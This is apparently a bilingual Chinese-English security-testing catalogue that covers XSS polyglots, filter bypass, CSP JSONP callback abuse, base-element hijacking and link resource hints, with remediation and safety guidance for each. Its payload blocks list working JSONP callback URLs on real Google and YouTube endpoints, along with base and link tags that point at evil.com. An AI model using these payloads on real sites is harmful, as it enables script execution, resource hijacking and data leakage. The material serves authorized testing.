title.zh: 修复并回归“跨上下文 XSS Polyglot”
title.en: Retest the Cross-Context XSS Polyglot remediation boundary

description.zh: 在数据写入每个最终 sink 时重新执行上下文编码，减少跨视图原样复用，并用模板自动转义、HTML 消毒与 Trusted Types 形成分层控制；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the exact breakout sequence, final DOM node, and execution event are recorded rather than attributing any response change to a successful polyglot no longer appears.

review.rationale: 跨上下文 XSS Polyglot保留为 Payload，用于审查“同一输入经过模板、HTML tokenizer 和 JavaScript 或 URL 子解析器后，是否在至少一个上下文形成可执行结构”。成立时必须满足证据要求“记录实际命中的闭合序列、最终 DOM 节点与执行事件，不能把任意响应变化归因于 Polyglot 成功”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 目标输出位置可能跨越标签、属性、URL 或脚本等多个解析上下文，并能记录每次模板和客户端重写。
prerequisites.en: The output may cross tag, attribute, URL, or script parsing contexts, and every template or client-side rewrite can be recorded.

prerequisites.zh: 每次只在一个已知上下文使用缩减后的 polyglot 与固定 marker，对照保存响应字节、DOM tokenizer 结果和调用栈。
prerequisites.en: Each run uses a minimized polyglot and fixed marker in one known context, preserving response bytes, DOM tokenizer results, and call stack for comparison.

analysis.zh: 阳性证据是 polyglot 在目标实际解析状态中突破边界、创建可执行属性或节点并触发 marker；报告必须指出生效的最小片段和 tokenizer 状态。 假阳性边界：WAF 放行、输入完整回显、DOM 发生无害修复、在另一上下文手工粘贴可执行或仅某浏览器报语法错误均是假阳性。
analysis.en: Positive evidence requires the polyglot to escape the actual target parser state, create an executable attribute or node, and trigger the marker, with the minimal effective fragment and tokenizer state identified. False-positive boundary: WAF allowance, intact reflection, harmless DOM repair, execution only after manual placement in another context, or a browser syntax error are false positives.

opsecTips.zh: 跨上下文 polyglot 每轮只保留一个触发面；出现页面结构大面积破坏、导航、无限事件、下载或网络请求时停止。
opsecTips.en: Cross-context polyglot testing retains one trigger surface per run; stop on broad layout damage, navigation, event loops, downloads, or network requests.

opsecTips.zh: 删除 polyglot 输入和渲染记录，清理模板、DOM 与 CDN 缓存，重建测试页面并确认正常内容的解析树恢复。
opsecTips.en: Delete polyglot inputs and rendered records, clear template, DOM, and CDN caches, rebuild the test page, and confirm the parse tree for normal content is restored.

name.zh: XSS 过滤与规范化绕过

description.zh: 比较大小写、畸形标签、字符引用和动态属性访问在过滤器与浏览器中的处理差异，定位黑名单式 XSS 防护缺口。
description.en: Compares case changes, malformed markup, character references, and dynamic property access between filters and browsers to locate blacklist-based XSS gaps.

overview.zh: XSS 过滤与规范化绕过评估边缘防护、源站和浏览器之间的解析差异，而不是把 WAF 放行视为成功。需要核对的行为为：边缘过滤器、服务端消毒器和浏览器是否对畸形标记与编码输入执行不同的规范化和 token 化。成立前提为：防护依赖关键字和正则黑名单，却没有在浏览器等价解析结果上实施元素、属性和 URL 协议允许列表。最终必须取得以下证据：同一请求在各层的规范化表示、WAF 动作、最终 DOM 和唯一执行标记能够完整关联。
overview.en: XSS Filter and Normalization Bypass checks whether edge filters, server-side sanitizers, and browsers canonicalize and tokenize malformed or encoded input differently. It applies when defenses rely on keyword or regular-expression blacklists instead of enforcing element, attribute, and URL-scheme allowlists on the browser-equivalent parse result. A conclusion requires the normalized representation at each layer, WAF action, final DOM, and unique execution marker can be correlated for one request; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 多层处理出现风险的前提为：防护依赖关键字和正则黑名单，却没有在浏览器等价解析结果上实施元素、属性和 URL 协议允许列表。审计应使用同一请求标识关联边缘动作、源站接收字节、应用输出与浏览器结果，并据此判断“边缘过滤器、服务端消毒器和浏览器是否对畸形标记与编码输入执行不同的规范化和 token 化”。只有 200 响应、告警缺失或规则未命中均不足以证明 XSS。
vulnerability.en: The risk exists when defenses rely on keyword or regular-expression blacklists instead of enforcing element, attribute, and URL-scheme allowlists on the browser-equivalent parse result, allowing whether edge filters, server-side sanitizers, and browsers canonicalize and tokenize malformed or encoded input differently. Review the input source, final parsing context, browser or policy version, and the normalized representation at each layer, WAF action, final DOM, and unique execution marker can be correlated for one request; otherwise record only an unconfirmed control differential.

exploitation.zh: 以普通标签作为基线，对大小写、空白、空字节与实体变体逐类重放；命中后缩减到单一变换，避免把组合串误当成必要条件。固定 WAF 规则集、源站版本与浏览器版本，先重放未编码基线，再逐类测试大小写、实体、空白或结构变化；命中后缩减为单一变换，并按“同一请求在各层的规范化表示、WAF 动作、最终 DOM 和唯一执行标记能够完整关联”完成确认。
exploitation.en: In an authorized isolated environment, use ordinary markup as a baseline, replay case, whitespace, null-byte, and entity variants by class, and minimize a hit to one transformation instead of treating a compound string as required. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 在统一解码后使用解析器型 HTML 消毒器，对 URL 方案和事件属性执行允许列表，并让 WAF 仅作为检测与纵深防御层。修复同时覆盖边缘规则和最终应用 sink，再使用相同请求标识重放正常与异常样例，确认 WAF 动作、源站规范化和浏览器 DOM 三层结果一致。
mitigation.en: Remediation should canonicalize once, use a parser-based HTML sanitizer, allowlist URL schemes and event-free attributes, and treat the WAF as detection and defense in depth. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 固定“XSS 过滤与规范化绕过”处理链版本
title.en: Scope the XSS Filter and Normalization Bypass data flow

description.zh: 记录边缘规则、文本转换顺序、源站框架与浏览器版本，并界定前提“防护依赖关键字和正则黑名单，却没有在浏览器等价解析结果上实施元素、属性和 URL 协议允许列表”的实际范围。
description.en: Trace the real input to the final sink or policy decision, confirm that defenses rely on keyword or regular-expression blacklists instead of enforcing element, attribute, and URL-scheme allowlists on the browser-equivalent parse result, and record browser, response-header, and relevant component versions.

title.zh: 关联“过滤器差异”多层基线
title.en: Establish the Filter Differential baseline

description.zh: 使用请求 ID 关联 WAF 动作、源站接收值和响应 DOM，并以“同一请求在各层的规范化表示、WAF 动作、最终 DOM 和唯一执行标记能够完整关联”作为最终证据要求。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the normalized representation at each layer, WAF action, final DOM, and unique execution marker can be correlated for one request as valid evidence.

title.zh: 逐变换验证“XSS 过滤与规范化绕过”
title.en: Run a single-variable XSS Filter and Normalization Bypass check

description.zh: 以普通标签作为基线，对大小写、空白、空字节与实体变体逐类重放；命中后缩减到单一变换，避免把组合串误当成必要条件；每轮只改变一种编码或语法形式，并将命中项缩减到可解释的最小差异。
description.en: use ordinary markup as a baseline, replay case, whitespace, null-byte, and entity variants by class, and minimize a hit to one transformation instead of treating a compound string as required; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 统一规范化并回归
title.en: Retest the XSS Filter and Normalization Bypass remediation boundary

description.zh: 在统一解码后使用解析器型 HTML 消毒器，对 URL 方案和事件属性执行允许列表，并让 WAF 仅作为检测与纵深防御层；重放相同请求集，确认边缘、源站和浏览器对输入形成一致且安全的结果。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the normalized representation at each layer, WAF action, final DOM, and unique execution marker can be correlated for one request no longer appears.

review.rationale: XSS 过滤与规范化绕过保留为 Payload，用于审查“边缘过滤器、服务端消毒器和浏览器是否对畸形标记与编码输入执行不同的规范化和 token 化”。成立时必须满足证据要求“同一请求在各层的规范化表示、WAF 动作、最终 DOM 和唯一执行标记能够完整关联”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 请求经过目标过滤器、应用解码和浏览器解析的同一真实路径，并可取得每层的原始与规范化值。
prerequisites.en: The request follows the same real path through the target filter, application decoding, and browser parsing, with raw and canonical values available at every layer.

prerequisites.zh: 存在会被正确阻断的危险基线和应被允许的普通 HTML 基线，绕过样例只调用本地一次性 marker。
prerequisites.en: A dangerous baseline is correctly blocked, a benign HTML baseline is allowed, and bypass samples call only a local one-time marker.

analysis.zh: 阳性证据是过滤层接受某变体，源站输出后浏览器规范化为可执行节点并触发 marker；边缘、源站和 DOM 证据须共享请求 ID。 假阳性边界：过滤器放行或返回 200、规则告警消失、输入被编码回显、浏览器产生惰性节点或直接绕过过滤层访问源站都不是有效绕过。
analysis.en: Positive evidence requires a variant to pass the filter, become an executable node after origin output and browser normalization, and trigger the marker, with edge, origin, and DOM evidence sharing one request identifier. False-positive boundary: Filter allowance or HTTP 200, disappearance of a rule alert, encoded reflection, an inert browser node, or direct-origin access that bypasses the filter is not a valid bypass.

opsecTips.zh: XSS 过滤差异测试限制为少量单变量样例；发现生产规则变化、缓存污染、用户流量命中或非 marker 执行时立即停止。
opsecTips.en: XSS filter differential testing uses a small single-variable set; stop on production rule changes, cache contamination, user-traffic impact, or execution beyond the marker.

opsecTips.zh: 撤销临时规则与源站调试，清理边缘和应用缓存、测试请求日志及 DOM 样例，并重放正常/阻断基线。
opsecTips.en: Revert temporary rules and origin debugging, clear edge and application caches, test-request logs, and DOM samples, then replay benign and blocked baselines.

name.zh: CSP 可信源 JSONP 回调滥用

description.zh: 验证 script-src 允许的源是否暴露可控 JSONP callback，使攻击者在已存在 HTML 注入时把可信响应转化为脚本执行。
description.en: Tests whether a script-src allowlisted origin exposes a controllable JSONP callback that turns an existing HTML injection into script execution.

overview.zh: CSP 可信源 JSONP 回调滥用用于核对 CSP 指令与具体浏览器能力之间的控制边界。审查目标为：允许列表中的 JSONP 端点是否接受任意回调表达式，并被浏览器作为跨源 script 响应执行。策略问题的成立前提为：页面已有脚本元素注入能力，生效 CSP 使用主机允许列表而非 nonce 或 hash，且可信主机提供未约束的 JSONP。判定证据为：目标页面实际 CSP、JSONP 响应 Content-Type 与回调体、以及唯一标记执行三项证据同时成立；普通导航、预取或单次外连必须与脚本执行分开记录。
overview.en: CSP Trusted-Origin JSONP Callback Abuse checks whether an allowlisted JSONP endpoint accepts an arbitrary callback expression and is executed by the browser as a cross-origin script response. It applies when the page already permits script-element injection, the effective CSP trusts hosts instead of nonces or hashes, and a trusted host exposes unconstrained JSONP. A conclusion requires the target policy, JSONP response content type and callback body, and unique marker execution are all captured together; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 策略风险的前提为：页面已有脚本元素注入能力，生效 CSP 使用主机允许列表而非 nonce 或 hash，且可信主机提供未约束的 JSONP。评估需要从最终响应中的生效 CSP 出发，逐项判断“允许列表中的 JSONP 端点是否接受任意回调表达式，并被浏览器作为跨源 script 响应执行”。若没有“目标页面实际 CSP、JSONP 响应 Content-Type 与回调体、以及唯一标记执行三项证据同时成立”，策略警告、资源请求或页面跳转都不能单独证明 CSP 被绕过。
vulnerability.en: The risk exists when the page already permits script-element injection, the effective CSP trusts hosts instead of nonces or hashes, and a trusted host exposes unconstrained JSONP, allowing whether an allowlisted JSONP endpoint accepts an arbitrary callback expression and is executed by the browser as a cross-origin script response. Review the input source, final parsing context, browser or policy version, and the target policy, JSONP response content type and callback body, and unique marker execution are all captured together; otherwise record only an unconfirmed control differential.

exploitation.zh: 先用无害回调名确认端点语法，再从目标页面加载同一端点并观察 CSP 控制台；只有回调在目标 origin 执行时才判定绕过。先保存完整响应头并展开指令回退关系，再以自有无害端点替换示例地址，记录 CSP 违规事件、网络 Initiator、最终 origin 和执行标记，分别评价每一种浏览器能力。
exploitation.en: In an authorized isolated environment, confirm endpoint syntax with a harmless callback name, then load it from the target page while observing CSP diagnostics; count a bypass only when the callback executes in the target origin. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 采用 nonce 或 hash 的严格 CSP，移除不必要的主机允许列表；JSONP 应迁移为 CORS JSON，并将回调参数限制为安全标识符或彻底取消。在同一浏览器与缓存状态下重放合法资源、业务导航和原异常样例，确认必要功能仍可用，并且相关指令稳定阻断越界脚本、框架、基地址或资源外连。
mitigation.en: Remediation should adopt a nonce- or hash-based strict CSP, remove unnecessary host allowlists, replace JSONP with CORS JSON, and constrain or eliminate callback parameters. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 解析“CSP 可信源 JSONP 回调滥用”的生效策略
title.en: Scope the CSP Trusted-Origin JSONP Callback Abuse data flow

description.zh: 抓取最终响应头并展开指令回退，确认前提“页面已有脚本元素注入能力，生效 CSP 使用主机允许列表而非 nonce 或 hash，且可信主机提供未约束的 JSONP”真实存在，而不是配置文档中的预期。
description.en: Trace the real input to the final sink or policy decision, confirm that the page already permits script-element injection, the effective CSP trusts hosts instead of nonces or hashes, and a trusted host exposes unconstrained JSONP, and record browser, response-header, and relevant component versions.

title.zh: 建立“CSP 可信源与 JSONP”策略基线
title.en: Establish the CSP Trusted Sources and JSONP baseline

description.zh: 用合法同源资源记录允许行为，再结合 CSP 违规事件、网络请求和证据标准“目标页面实际 CSP、JSONP 响应 Content-Type 与回调体、以及唯一标记执行三项证据同时成立”区分结果。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the target policy, JSONP response content type and callback body, and unique marker execution are all captured together as valid evidence.

title.zh: 逐能力验证“CSP 可信源 JSONP 回调滥用”
title.en: Run a single-variable CSP Trusted-Origin JSONP Callback Abuse check

description.zh: 先用无害回调名确认端点语法，再从目标页面加载同一端点并观察 CSP 控制台；只有回调在目标 origin 执行时才判定绕过；将示例域替换为自有无害端点，每次只测试一种元素、指令或 URL 方案。
description.en: confirm endpoint syntax with a harmless callback name, then load it from the target page while observing CSP diagnostics; count a bypass only when the callback executes in the target origin; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)
https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();
https://www.youtube.com/oembed?callback=alert;

title.zh: 收紧 CSP 并执行回归
title.en: Retest the CSP Trusted-Origin JSONP Callback Abuse remediation boundary

description.zh: 采用 nonce 或 hash 的严格 CSP，移除不必要的主机允许列表；JSONP 应迁移为 CORS JSON，并将回调参数限制为安全标识符或彻底取消；随后重放业务资源与异常输入，确认指令边界清晰且合法内容仍可加载。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the target policy, JSONP response content type and callback body, and unique marker execution are all captured together no longer appears.

review.rationale: CSP 可信源 JSONP 回调滥用保留为 Payload，用于审查“允许列表中的 JSONP 端点是否接受任意回调表达式，并被浏览器作为跨源 script 响应执行”。成立时必须满足证据要求“目标页面实际 CSP、JSONP 响应 Content-Type 与回调体、以及唯一标记执行三项证据同时成立”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 页面已存在可创建 script 元素的 HTML 注入，实际 CSP 信任目标源，且该源的 JSONP callback 参数仍可控并返回 JavaScript。
prerequisites.en: The page already has HTML injection capable of creating a script element, the actual CSP trusts the target origin, and that origin still exposes a controllable JSONP callback returning JavaScript.

prerequisites.zh: 使用自有 JSONP 模拟端点或明确授权的测试端点，保存 CSP header、响应 Content-Type/body、script 加载记录和固定 callback marker。
prerequisites.en: An owned JSONP mock or explicitly authorized test endpoint preserves the CSP header, response Content-Type and body, script-load record, and fixed callback marker.

analysis.zh: 阳性证据是受 CSP 信任的 script 请求返回攻击者可控 callback 代码，并在目标页面来源下执行 marker；需证明 HTML 注入与 JSONP 可控性同时成立。 假阳性边界：可信域 URL 可访问、XHR/CORS 成功、端点拒绝 callback、返回 JSON 而非脚本、公共示例已下线或 CSP 实际未允许该源都不是绕过。
analysis.en: Positive evidence requires the CSP-trusted script request to return attacker-controlled callback code and execute the marker under the target-page origin, proving both HTML injection and JSONP control. False-positive boundary: A reachable trusted-origin URL, successful XHR or CORS, callback rejection, JSON rather than script output, a retired public example, or a source absent from the actual CSP is not a bypass.

opsecTips.zh: JSONP CSP 测试不得调用真实公共服务或提交用户数据；只用自有 callback marker，发现第三方请求或真实令牌进入 URL 时停止。
opsecTips.en: JSONP CSP testing must not call real public services or submit user data; use an owned callback marker only and stop if a third party is contacted or a real token enters the URL.

opsecTips.zh: 移除注入的 script 与 JSONP mock，清理脚本/CDN 缓存和 CSP 报告，删除 callback 日志并恢复原策略与页面内容。
opsecTips.en: Remove injected scripts and the JSONP mock, clear script and CDN caches plus CSP reports, delete callback logs, and restore the original policy and page content.

name.zh: base 元素基地址劫持

description.zh: 验证可注入 base 元素是否改变相对脚本、表单或链接的解析目标；该问题属于 HTML 注入和 CSP base-uri 边界，而非自动脚本执行。
description.en: Tests whether an injected base element changes resolution of relative scripts, forms, or links; this is an HTML-injection and CSP base-uri issue, not automatic script execution.

overview.zh: base 元素基地址劫持用于核对 CSP 指令与具体浏览器能力之间的控制边界。审查目标为：攻击者控制的 base href 是否在应用自己的相对资源解析前生效，并把请求或交互导航导向外部 origin。策略问题的成立前提为：应用允许在 head 前部或首个有效 base 位置注入 HTML，同时 CSP 未设置 base-uri none 或可信源限制。判定证据为：document.baseURI 的变化与至少一个真实相对 URL 的解析结果一致，且没有把 target=_blank 行为误报为脚本执行；普通导航、预取或单次外连必须与脚本执行分开记录。
overview.en: Base Element URL Hijacking checks whether an attacker-controlled base href takes effect before application-relative URL resolution and redirects resource or interaction requests to another origin. It applies when the application permits HTML injection before or at the first effective base position while CSP omits base-uri none or an appropriate origin restriction. A conclusion requires a change in document.baseURI matches resolution of a real relative URL, without misreporting target=_blank behavior as script execution; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 策略风险的前提为：应用允许在 head 前部或首个有效 base 位置注入 HTML，同时 CSP 未设置 base-uri none 或可信源限制。评估需要从最终响应中的生效 CSP 出发，逐项判断“攻击者控制的 base href 是否在应用自己的相对资源解析前生效，并把请求或交互导航导向外部 origin”。若没有“document.baseURI 的变化与至少一个真实相对 URL 的解析结果一致，且没有把 target=_blank 行为误报为脚本执行”，策略警告、资源请求或页面跳转都不能单独证明 CSP 被绕过。
vulnerability.en: The risk exists when the application permits HTML injection before or at the first effective base position while CSP omits base-uri none or an appropriate origin restriction, allowing whether an attacker-controlled base href takes effect before application-relative URL resolution and redirects resource or interaction requests to another origin. Review the input source, final parsing context, browser or policy version, and a change in document.baseURI matches resolution of a real relative URL, without misreporting target=_blank behavior as script execution; otherwise record only an unconfirmed control differential.

exploitation.zh: 记录注入前 document.baseURI 与关键相对资源 URL，再提交原 base 变体并观察解析后的绝对地址；禁止让测试端点收集真实凭据。先保存完整响应头并展开指令回退关系，再以自有无害端点替换示例地址，记录 CSP 违规事件、网络 Initiator、最终 origin 和执行标记，分别评价每一种浏览器能力。
exploitation.en: In an authorized isolated environment, record document.baseURI and critical relative URLs before injection, submit the original base variants, and observe resolved absolute addresses without allowing the test endpoint to collect real credentials. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 阻止不可信 HTML 进入 head，固定或绝对化敏感资源与表单 URL，并在 CSP 中设置 base-uri none 或精确的 self 策略。在同一浏览器与缓存状态下重放合法资源、业务导航和原异常样例，确认必要功能仍可用，并且相关指令稳定阻断越界脚本、框架、基地址或资源外连。
mitigation.en: Remediation should keep untrusted HTML out of head, use fixed or absolute URLs for sensitive resources and forms, and set CSP base-uri to none or a precise self policy. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 解析“base 元素基地址劫持”的生效策略
title.en: Scope the Base Element URL Hijacking data flow

description.zh: 抓取最终响应头并展开指令回退，确认前提“应用允许在 head 前部或首个有效 base 位置注入 HTML，同时 CSP 未设置 base-uri none 或可信源限制”真实存在，而不是配置文档中的预期。
description.en: Trace the real input to the final sink or policy decision, confirm that the application permits HTML injection before or at the first effective base position while CSP omits base-uri none or an appropriate origin restriction, and record browser, response-header, and relevant component versions.

title.zh: 建立“HTML 基地址与 CSP”策略基线
title.en: Establish the HTML Base URL and CSP baseline

description.zh: 用合法同源资源记录允许行为，再结合 CSP 违规事件、网络请求和证据标准“document.baseURI 的变化与至少一个真实相对 URL 的解析结果一致，且没有把 target=_blank 行为误报为脚本执行”区分结果。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only a change in document.baseURI matches resolution of a real relative URL, without misreporting target=_blank behavior as script execution as valid evidence.

title.zh: 逐能力验证“base 元素基地址劫持”
title.en: Run a single-variable Base Element URL Hijacking check

description.zh: 记录注入前 document.baseURI 与关键相对资源 URL，再提交原 base 变体并观察解析后的绝对地址；禁止让测试端点收集真实凭据；将示例域替换为自有无害端点，每次只测试一种元素、指令或 URL 方案。
description.en: record document.baseURI and critical relative URLs before injection, submit the original base variants, and observe resolved absolute addresses without allowing the test endpoint to collect real credentials; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<base href="https://evil.com/">
<base href="//evil.com/">
<base href="http://evil.com/">
<base target="_blank" href="https://evil.com/">
<base target="_blank" href="//evil.com/">
<base target="_blank" href="http://evil.com/">

title.zh: 收紧 CSP 并执行回归
title.en: Retest the Base Element URL Hijacking remediation boundary

description.zh: 阻止不可信 HTML 进入 head，固定或绝对化敏感资源与表单 URL，并在 CSP 中设置 base-uri none 或精确的 self 策略；随后重放业务资源与异常输入，确认指令边界清晰且合法内容仍可加载。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while a change in document.baseURI matches resolution of a real relative URL, without misreporting target=_blank behavior as script execution no longer appears.

review.rationale: base 元素基地址劫持保留为 Payload，用于审查“攻击者控制的 base href 是否在应用自己的相对资源解析前生效，并把请求或交互导航导向外部 origin”。成立时必须满足证据要求“document.baseURI 的变化与至少一个真实相对 URL 的解析结果一致，且没有把 target=_blank 行为误报为脚本执行”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: base 元素可在相对 URL 被解析前注入有效文档位置，页面确实使用相对脚本、链接或表单，且已捕获 CSP base-uri。
prerequisites.en: A base element can be injected into an effective document position before relative URLs resolve, the page uses relative scripts, links, or forms, and CSP base-uri is captured.

prerequisites.zh: 替代基地址指向自有无内容源，使用专用相对资源和测试表单，记录 document.baseURI、解析后 URL 与网络事件。
prerequisites.en: The replacement base points to an owned content-free origin, dedicated relative resources and a test form are used, and document.baseURI, resolved URLs, and network events are recorded.

analysis.zh: 阳性证据是注入节点改变 document.baseURI，并使一个预先指定的相对资源或测试动作解析到自有源；影响需按资源劫持、导航或表单目标分别描述。 假阳性边界：base 标签出现在 DOM 但位于首个有效 base 之后、所有 URL 都是绝对地址、CSP base-uri 阻断，或只有静态字符串变化都不是可利用基地址劫持。
analysis.en: Positive evidence requires the injected node to change document.baseURI and resolve a designated relative resource or test action to the owned origin, with resource hijack, navigation, and form-target impact described separately. False-positive boundary: A base tag after the first effective base, exclusively absolute URLs, CSP base-uri blocking, or static string changes without URL resolution is not exploitable base hijacking.

opsecTips.zh: base 测试禁止提交真实表单或加载带凭据资源；出现用户导航、认证头发往测试源或非指定相对资源重定向时停止。
opsecTips.en: Base-element testing must not submit real forms or load credentialed resources; stop on user navigation, authentication headers sent to the test origin, or redirection of an undesignated relative resource.

opsecTips.zh: 删除 base 节点与测试表单/资源，清理导航历史和缓存，恢复 CSP，并重载验证 document.baseURI 与全部相对链接恢复。
opsecTips.en: Remove the base node and test forms or resources, clear navigation history and caches, restore CSP, and reload to verify document.baseURI and all relative links are restored.

name.zh: link 资源提示与外连探测
name.en: Link Resource Hint and Outbound Fetch Testing

description.zh: 区分 prefetch、dns-prefetch、preload 与 modulepreload 产生的网络行为，验证 HTML 注入是否造成资源外连，而不把请求本身误称为 XSS。
description.en: Distinguishes network behavior from prefetch, dns-prefetch, preload, and modulepreload to test outbound resource loads without mislabeling the request itself as XSS.

overview.zh: link 资源提示与外连探测用于核对 CSP 指令与具体浏览器能力之间的控制边界。审查目标为：可注入 link 元素是否触发 DNS 查询或资源获取，以及对应请求受哪一条 CSP 指令和浏览器缓存策略控制。策略问题的成立前提为：富文本或模板允许 link 元素，资源目标可控，并且适用的 default-src、script-src、style-src、font-src 或 connect-src 边界过宽。判定证据为：浏览器网络面板或受控 DNS 日志显示与唯一标记对应的请求，同时记录 Initiator、资源类型和 CSP 决策；普通导航、预取或单次外连必须与脚本执行分开记录。
overview.en: Link Resource Hint and Outbound Fetch Testing checks whether an injected link element triggers DNS resolution or resource fetching and which CSP directive and cache policy govern the request. It applies when rich text or templating permits link elements, the destination is controllable, and the applicable default-src, script-src, style-src, font-src, or connect-src boundary is too broad. A conclusion requires browser network data or controlled DNS logs show a marker-correlated request together with its initiator, resource type, and CSP decision; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 策略风险的前提为：富文本或模板允许 link 元素，资源目标可控，并且适用的 default-src、script-src、style-src、font-src 或 connect-src 边界过宽。评估需要从最终响应中的生效 CSP 出发，逐项判断“可注入 link 元素是否触发 DNS 查询或资源获取，以及对应请求受哪一条 CSP 指令和浏览器缓存策略控制”。若没有“浏览器网络面板或受控 DNS 日志显示与唯一标记对应的请求，同时记录 Initiator、资源类型和 CSP 决策”，策略警告、资源请求或页面跳转都不能单独证明 CSP 被绕过。
vulnerability.en: The risk exists when rich text or templating permits link elements, the destination is controllable, and the applicable default-src, script-src, style-src, font-src, or connect-src boundary is too broad, allowing whether an injected link element triggers DNS resolution or resource fetching and which CSP directive and cache policy govern the request. Review the input source, final parsing context, browser or policy version, and browser network data or controlled DNS logs show a marker-correlated request together with its initiator, resource type, and CSP decision; otherwise record only an unconfirmed control differential.

exploitation.zh: 清空缓存后逐一测试各 rel 值，使用不可识别用户的数据标记区分 DNS 与 HTTP 访问，并在不同浏览器中记录不保证触发的资源提示行为。先保存完整响应头并展开指令回退关系，再以自有无害端点替换示例地址，记录 CSP 违规事件、网络 Initiator、最终 origin 和执行标记，分别评价每一种浏览器能力。
exploitation.en: In an authorized isolated environment, clear caches, test each rel value separately, distinguish DNS from HTTP activity with non-user-identifying markers, and record browser-specific best-effort resource-hint behavior. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 消毒不需要的 link 元素和 rel 值，收紧各资源类型 CSP 指令，并通过出口策略限制前端可访问的非业务域名。在同一浏览器与缓存状态下重放合法资源、业务导航和原异常样例，确认必要功能仍可用，并且相关指令稳定阻断越界脚本、框架、基地址或资源外连。
mitigation.en: Remediation should sanitize unnecessary link elements and rel values, tighten resource-specific CSP directives, and use outbound policy to restrict non-business destinations. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 解析“link 资源提示与外连探测”的生效策略
title.en: Scope the Link Resource Hint and Outbound Fetch Testing data flow

description.zh: 抓取最终响应头并展开指令回退，确认前提“富文本或模板允许 link 元素，资源目标可控，并且适用的 default-src、script-src、style-src、font-src 或 connect-src 边界过宽”真实存在，而不是配置文档中的预期。
description.en: Trace the real input to the final sink or policy decision, confirm that rich text or templating permits link elements, the destination is controllable, and the applicable default-src, script-src, style-src, font-src, or connect-src boundary is too broad, and record browser, response-header, and relevant component versions.

title.zh: 建立“资源提示与 CSP”策略基线
title.en: Establish the Resource Hints and CSP baseline

description.zh: 用合法同源资源记录允许行为，再结合 CSP 违规事件、网络请求和证据标准“浏览器网络面板或受控 DNS 日志显示与唯一标记对应的请求，同时记录 Initiator、资源类型和 CSP 决策”区分结果。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only browser network data or controlled DNS logs show a marker-correlated request together with its initiator, resource type, and CSP decision as valid evidence.

title.zh: 逐能力验证“link 资源提示与外连探测”
title.en: Run a single-variable Link Resource Hint and Outbound Fetch Testing check

description.zh: 清空缓存后逐一测试各 rel 值，使用不可识别用户的数据标记区分 DNS 与 HTTP 访问，并在不同浏览器中记录不保证触发的资源提示行为；将示例域替换为自有无害端点，每次只测试一种元素、指令或 URL 方案。
description.en: clear caches, test each rel value separately, distinguish DNS from HTTP activity with non-user-identifying markers, and record browser-specific best-effort resource-hint behavior; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<link rel=prefetch href="//evil.com/">
<link rel=dns-prefetch href="//evil.com">
<link rel=preload href="//evil.com/" as=script>
<link rel=preload href="//evil.com/" as=style>
<link rel=preload href="//evil.com/" as=image>
<link rel=preload href="//evil.com/" as=font>
<link rel=preload href="//evil.com/" as=fetch crossorigin>
<link rel=modulepreload href="//evil.com/">

title.zh: 收紧 CSP 并执行回归
title.en: Retest the Link Resource Hint and Outbound Fetch Testing remediation boundary

description.zh: 消毒不需要的 link 元素和 rel 值，收紧各资源类型 CSP 指令，并通过出口策略限制前端可访问的非业务域名；随后重放业务资源与异常输入，确认指令边界清晰且合法内容仍可加载。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while browser network data or controlled DNS logs show a marker-correlated request together with its initiator, resource type, and CSP decision no longer appears.

review.rationale: link 资源提示与外连探测保留为 Payload，用于审查“可注入 link 元素是否触发 DNS 查询或资源获取，以及对应请求受哪一条 CSP 指令和浏览器缓存策略控制”。成立时必须满足证据要求“浏览器网络面板或受控 DNS 日志显示与唯一标记对应的请求，同时记录 Initiator、资源类型和 CSP 决策”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

